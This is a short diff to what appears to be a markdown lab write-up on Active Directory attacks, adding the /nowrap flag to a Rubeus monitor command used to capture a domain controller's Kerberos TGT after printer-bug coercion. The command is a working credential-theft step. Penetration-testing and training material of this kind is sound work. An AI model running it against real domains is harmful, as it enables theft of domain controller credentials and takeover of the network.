@@ -35,7 +35,7 @@ Attempted printer notification and received an invalid handle. The coerced authe
 ### 3️⃣ **Monitoring for TGT Capture Using Rubeus**
 We use **Rubeus** in monitoring mode to capture the **TGT** from the DC:
 ```cmd
-C:\Tools> Rubeus.exe monitor /interval:5 /filteruser:CDC01$
+C:\Tools> Rubeus.exe monitor /interval:5 /filteruser:CDC01$ /nowrap
 ```
 ✅ If successful, **Rubeus** will display the captured **TGT** for the **Domain Controller (CDC01$)**:
 ```
